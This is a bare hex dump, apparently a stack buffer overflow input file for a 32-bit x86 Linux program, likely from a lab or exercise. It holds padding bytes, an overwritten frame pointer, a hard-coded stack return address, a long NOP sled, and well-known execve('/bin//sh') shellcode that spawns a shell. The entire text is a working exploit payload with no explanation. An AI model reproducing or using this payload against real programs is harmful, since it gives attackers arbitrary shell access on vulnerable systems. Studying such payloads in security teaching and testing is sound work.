aa aa aa aa aa aa aa aa
aa aa aa aa aa aa aa aa
aa aa aa aa aa aa aa aa
aa aa aa aa aa aa aa aa
bb bb bb bb c0 f5 ff bf
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
31 c0 50 68 2f 2f 73 68
68 2f 62 69 6e 89 e3 50
53 89 e1 99 b0 0b cd 80
